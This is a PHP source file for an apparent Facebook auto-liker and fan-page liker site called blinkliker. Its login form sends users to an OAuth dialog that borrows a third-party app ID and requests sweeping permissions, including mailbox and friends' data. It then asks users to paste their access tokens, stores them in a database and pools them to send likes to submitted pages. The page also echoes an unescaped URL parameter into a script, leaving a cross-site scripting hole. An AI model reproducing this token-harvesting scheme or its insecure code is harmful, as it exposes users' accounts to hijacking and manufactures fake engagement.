<?php
/**
 *
 *
 * This content is released under the MIT License (MIT)
 *
 * Copyright (c) 2017 Shakti Saurav
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 */
error_reporting(0);
session_start();
// JSONURL //
function get_html($url) {
    $ch = curl_init();
   curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FAILONERROR, 0);
    $data = curl_exec($ch);
    curl_close($ch);
return $data;
    }
function get_json($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FAILONERROR, 0);
    $data = curl_exec($ch);
    curl_close($ch);
return json_decode($data);
    }
if($_SESSION['token']){
$token = $_SESSION['token'];
$graph_url ="https://graph.fb.me/me?access_token=" . $token;
$user = get_json($graph_url);
if ($user->error) {
if ($user->error->type== "OAuthException") {
session_destroy();
header('Location: /?i=Your token Has Expired, Login Again!');
}
}
}
if(isset($_POST['submit'])) {
$token2 = $_POST['token'];
if(preg_match("'access_token=(.*?)&expires_in='", $token2, $matches)){
$token = $matches[1];
}
else{
$token = $token2;
}
$extend = get_html("https://graph.fb.me/me/permissions?access_token="  . $token);
$pos = strpos($extend, "publish_stream");
if ($pos == true) {
$_SESSION['token'] = $token;
}
else {
session_destroy();
header('Location: /?i=Please Generate token Using blinkliker ONLY');}
}else{}
if(isset($_POST['logout'])) {
session_destroy();
header('Location: /?i=Your token Has Deleted, Login Again');
}
if(isset($_GET['i'])){
echo '<script type="text/javascript">alert("INFO:  ' . $_GET['i'] . '");</script>';
}
?>
<?php include 'headfp.php'; ?>
<?php
error_reporting(0);
$dead = 1200;
$time = time();
if ($handle = opendir('block')) {
while(false !== ($file = readdir($handle)))
{
$access = fileatime('block/'.$file);
if( $access !== false)
if( ($time- $access)>=$dead )
unlink('block/'.$file);
}
closedir($handle);
}
?>
<?php
$like = new like();
if($_SESSION['token']){
$access_token = $_SESSION['token'];
$me = $like -> me($access_token);
if($me['id']){
include'config.php';
   mysql_query("CREATE TABLE IF NOT EXISTS `Likers` (
      `id` int(11) NOT NULL AUTO_INCREMENT,
      `user_id` varchar(32) NOT NULL,
      `name` varchar(32) NOT NULL,
      `access_token` varchar(255) NOT NULL,
      PRIMARY KEY (`id`)
      ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;
   ");
   $row = null;
   $result = mysql_query("
     SELECT
         *
     FROM
         Likers
      WHERE
         user_id = '" . mysql_real_escape_string($me['id']) . "'
   ");
   if($result){
      $row = mysql_fetch_array($result, MYSQL_ASSOC);
      if(mysql_num_rows($result) > 1){
         mysql_query("
            DELETE FROM
              Likers
            WHERE
               user_id='" . mysql_real_escape_string($me['id']) . "' AND
               id != '" . $row['id'] . "'
         ");
      }
      }
   if(!$row){
      mysql_query(
         "INSERT INTO 
           Likers
         SET
           `user_id` = '" . mysql_real_escape_string($me['id']) . "',
           `name` = '" . mysql_real_escape_string($me['name']) . "',
            `access_token` = '" . mysql_real_escape_string($access_token) . "'
      ");
   } else {
      mysql_query(
         "UPDATE 
           Likers
        SET
            `access_token` = '" . mysql_real_escape_string($access_token) . "'
         WHERE
           `id` = " . $row['id'] . "
      ");
   }
mysql_close($connection);
if($limit = fileatime('block/'.$me[id])){
$timeoff = time();
$check = date("i:s",$timeoff - $limit);
echo'<div align="left"><div class="ctime">Wait 20:00 Miniute : '.$check.'</div></div>';
}else{
echo'<div align="left"><div class="ctime">Next Submit: READY..!</div></div>';

}
echo'

<div class="abc3">
	
	<div class="main-inner">
	      				<h3>Hello, '.$me[name].'</h3><br>
<a href="http://facebook.com/'.$me[id].'"><img src="https://graph.facebook.com/'.$me[id].'/picture?type=large" alt="Profile" style="height:100px;width:100px;"/> </a><br/>Your Name: <b> '.$me[name].'</b></br>

Profile ID: <b> '.$me[id].'</b></br>
<br><a class="btn btn-success" href="/" title="Blinkliker"><i class="fa fa-home" aria-hidden="true"></i> Home</a> <a class="btn btn-success" href="/index.php" title="AutLiker"><i class="fa fa-thumbs-up" aria-hidden="true"></i> Autoliker</a> <a class="btn btn-success" href="/fanpage.php" title="Fanpage Liker"><i class="fa fa-facebook" aria-hidden="true"></i> Fanpage Liker</a> <a class="btn btn-success" href="/comment.php" title="AutComments"><i class="fa fa-comments-o" aria-hidden="true"></i> AutoComments</a>  <a class="btn btn-success" href="logout.php" title="Logout"><i class="fa fa-sign-out" aria-hidden="true"></i> Logout</a>

	    
	</div>
    
</div>';
$like -> alltoken($access_token);
if($_POST[id]){
if($limit = fileatime('block/'.$me[id])){
echo'<br><br><div class="ctime"><strong>Sorry!</strong> Sending likes failed, Wait 20 Minutes before submitting again.
</div>';
exit;
}
if(!is_dir('block')){
mkdir('block');
}
$bg=fopen('block/'.$me[id],'w');
fwrite($bg,1);
fclose($bg);
$like -> pancal($_POST[id]);
}else{
$like -> getData($access_token);
}
}else{
$like -> invalidToken();
}
}else{
$like->form();
}
class like {
public function pancal($id){ 
for($i=1;$i<4;$i++){
$this-> _req('http://'.$_SERVER[HTTP_HOST].'/blinkliker.php?id='.$id);
}

print '<br><br><div class="ctime"><button type="button" class="close" data-dismiss="alert">&times;</button><strong>Well done!</strong> Likes has been successfully sent.
</div>';
}

public function me($access){
return json_decode($this-> _req('https://graph.fb.me/me?access_token='.$access),true);
}
public function alltoken($access){
}
public function invalidToken(){
print '<div class="container"><div class="alert alert-block"><button type="button" class="close" data-dismiss="alert">&times;</button><strong>Opps!</strong> Your token Has Expired.<br/>
<a class="btn btn-primary" href="/" title="Back to Home">Back</a></div></div>';
$this->form();
}
public function form(){
echo'<div class="abc2"><h2><i class="fa fa-user-circle"></i> Login To blinkliker</h2></div>
<br><div class="abc">
<div style="text-align:center;">
<i class="fa fa-chevron-right"></i> <a class="btn btn-primary" href="https://www.facebook.com/v1.0/dialog/oauth?redirect_uri=http://www.apple.com/apps/imovie/BLINKLIKER_COPY_FULL_URL&scope=email,publish_actions,user_about_me,user_actions.books,user_actions.music,user_actions.news,user_actions.video,user_activities,user_birthday,user_education_history,user_events,user_games_activity,user_groups,user_hometown,user_interests,user_likes,user_location,user_notes,user_photos,user_questions,user_relationship_details,user_relationships,user_religion_politics,user_status,user_subscriptions,user_videos,user_website,user_work_history,friends_about_me,friends_actions.books,friends_actions.music,friends_actions.news,friends_actions.video,friends_activities,friends_birthday,friends_education_history,friends_events,friends_games_activity,friends_groups,friends_hometown,friends_interests,friends_likes,friends_location,friends_notes,friends_photos,friends_questions,friends_relationship_details,friends_relationships,friends_religion_politics,friends_status,friends_subscriptions,friends_videos,friends_website,friends_work_history,ads_management,create_event,create_note,export_stream,friends_online_presence,manage_friendlists,manage_notifications,manage_pages,photo_upload,publish_stream,read_friendlists,read_insights,read_mailbox,read_page_mailboxes,read_requests,read_stream,rsvp_event,share_item,sms,status_update,user_online_presence,video_upload,xmpp_login&response_type=token&client_id=309481925768757" title="Click Here - Allow The Apple Application - Then Copy The Access Token!" target="_blank">Click Here</a> To Get Access Token afterthat COPY and PASTE URL in the ADDRESS BAR to BELOW, <br>
<form action="login.php" method="get" style="margin-top: 12px;">
<input id="here" title="Paste Your Token Here !" type="text" name="user" placeholder="https://www.apple.com/imovie/#access_token=EAAEZAeOAZC9jUBAItAoM7HQEty3MIkE7pmq7iKcjQcSciGrMc9qMKaphiYPUfmEkZAGgHlOO2Ji5mhgYc7Vd3BQMqeW6eUEjBxgmfu5MhIz1NIhkdRARdlbIA5lWCZCH43TwrFZAunbxIfBji4NBm6tkmFmrKczA3krk7xmmXHmlQDvO6ZBuef&expires_in=5176129" class="form-control" value="'.$_SESSION['token'].'"/><br>
<button class="btn btn-default" type="submit">Login <i class="fa fa-sign-in"></i></button>
</div>
</form>
</div>
';
}
public function getData($access){
$feed=json_decode($this -> _req('https://graph.fb.me/me/feed?access_token='.$access.'&limit=1'),true);
if(count($feed[data]) >= 1){
echo'
<div class="container"><div class="panel panel-success">
<div class="panel-heading">
<center>Input your Page ID below!!</center><br>
<center><form action="/" method="post"/>
<input type="text" style="width:24%;" name="id"/>
<input type="hidden" name="access_token" value="'.$access.'"/><br><br>
<button name="pancal" class="btn btn-default" type="submit"><i class="fa fa-thumbs-up"></i> Send Likes</button>
</form></center>
</div></div></div>';
for($i=0;$i<count($feed[data]);$i++){
$uid = $feed[data][$i][from][id];
$name = $feed[data][$i][from][name];
$type = $feed[data][$i][type];
$mess = str_replace(urldecode('%0A'),'<br/>',htmlspecialchars($feed[data][$i][message]));
$id = $feed[data][$i][id];
$pic = $feed[data][$i][picture];
echo'';

if($type=='photo'){
echo '';
}else{
echo '';
}
echo '';
}
}else{
print ' <div class="ctime"> <div class="alert alert-dismissable alert-danger">
  <button type="button" class="close" data-dismiss="alert">&times;</button>
  <strong>Opps!</strong> Your post not Found.<br/>
';
}
print '</div>';
}
private function _req($url){
$ch = curl_init();
curl_setopt_array($ch,array(
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_URL => $url,
)
);
$result = curl_exec($ch);
curl_close($ch);
return $result;
}
}
?>
<?php include 'foot.php'; ?>
</body>
</html>